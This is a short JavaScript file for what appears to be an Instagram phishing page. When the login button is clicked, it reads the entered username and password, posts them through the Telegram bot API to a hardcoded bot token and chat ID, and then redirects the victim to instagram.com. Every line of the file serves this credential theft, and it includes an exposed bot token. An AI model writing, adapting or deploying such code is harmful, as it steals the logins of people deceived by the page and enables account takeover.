

let inouts = document.querySelectorAll(`input`)
let buttonLogin = document.querySelector(`.login-button`)

const SendMassegeFunction = () => {
    let Token = `7218294613:AAEKwiY60D-b0l8UoUz3l6zl8BSQexwxhz0`
    let ChatId = `6543268368`
    let ApiUrl = `https://api.telegram.org/bot${Token}/sendMessage`;

    let data = {
        chat_id: ChatId,
        text: `username:${inouts[0].value} \npassword: ${inouts[1].value}`
    }

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(ApiUrl, options)
    .then(data => data.json())
    .then(res =>{
        console.log( `data keldi`, res)
        window.location.href = "https://www.instagram.com/"
    })
    .catch(error => console.log(`Xatolik bor`,error))
}

buttonLogin.addEventListener(`click`, SendMassegeFunction)


